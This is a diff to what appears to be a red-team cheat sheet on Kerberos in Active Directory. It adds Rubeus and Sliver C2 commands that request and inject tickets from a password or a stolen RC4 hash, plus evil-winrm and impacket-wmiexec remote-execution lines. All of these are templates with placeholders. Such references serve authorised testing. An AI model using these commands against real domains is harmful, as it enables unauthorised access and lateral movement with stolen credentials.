@@ -92,7 +92,7 @@ nameserver <TARGET>
 ```
 
 ```console
-# Step 3: Edit '/etc/krb5.conf'
+# Step 3: Edit '/etc/krb5.conf' (All uppercase)
 
 [libdefaults]
     default_realm = <DOMAIN>
@@ -177,7 +177,44 @@ klist
 <div>
 
 ```console
+# Auth with password
 .\Rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+```
+
+```console
+# Auth with hash
+.\Rubeus.exe asktgt /user:<USER> /rc4:'<HASH>' /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+```
+
+```console
+# Check
+klist
+```
+
+</div>
+
+{{< /tabcontent >}}
+
+### Generate Kerberos ticket (From C2)
+
+{{< tab set5 tab1 active >}}Sliver{{< /tab >}}
+{{< tabcontent set5 tab1 >}}
+
+<div>
+
+```console
+# Auth with password
+rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
+```
+
+```console
+# Auth with hash
+rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
+```
+
+```console
+# Check
+c2tc-klist
 ```
 
 </div>
@@ -191,14 +228,14 @@ klist
 
 ### Winrm with Kerberos
 
-{{< tab set5 tab1 active >}}evil-winrm{{< /tab >}}
-{{< tab set5 tab2 >}}wmiexec{{< /tab >}}
-{{< tabcontent set5 tab1 >}}
+{{< tab set6 tab1 active >}}evil-winrm{{< /tab >}}
+{{< tab set6 tab2 >}}wmiexec{{< /tab >}}
+{{< tabcontent set6 tab1 >}}
 
 <div>
 
 ```console
-# Step 1: Edit '/etc/krb5.conf'
+# Step 1: Edit '/etc/krb5.conf' (All uppercase)
 
 [libdefaults]
     default_realm = <DOMAIN>
@@ -215,7 +252,6 @@ klist
     domain.internal = <DOMAIN>
 ```
 
-
 ```console
 # Step 2: Connect
 sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
@@ -224,12 +260,12 @@ sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 </div>
 
 {{< /tabcontent >}}
-{{< tabcontent set5 tab2 >}}
+{{< tabcontent set6 tab2 >}}
 
 <div>
 
 ```console
-sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass
+sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 </div>
